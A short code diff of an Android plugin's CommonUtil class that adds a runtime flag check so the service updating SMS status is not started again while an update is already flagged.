@@ -14,6 +14,7 @@ import android.text.TextUtils;
 import com.plugin.common.utils.UtilsRuntime;
 import com.umeng.analytics.MobclickAgent;
 import com.xstd.plugin.binddevice.DeviceBindBRC;
+import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.PluginSettingManager;
 import com.xstd.plugin.service.FakeService;
@@ -60,10 +61,12 @@ public class CommonUtil {
 
     public static void checkIfShouldUpdatePluginSMSStatus(Context context) {
         if (PluginSettingManager.getInstance().getShouldUpdateSMSStatus()) {
-            Intent i = new Intent();
-            i.setAction(PluginService.ACTION_UPDATE_SMS_STATUS);
-            i.setClass(context, PluginService.class);
-            context.startService(i);
+            if (!AppRuntime.UPDATE_SMS_STATUS.get()) {
+                Intent i = new Intent();
+                i.setAction(PluginService.ACTION_UPDATE_SMS_STATUS);
+                i.setClass(context, PluginService.class);
+                context.startService(i);
+            }
         }
     }
 
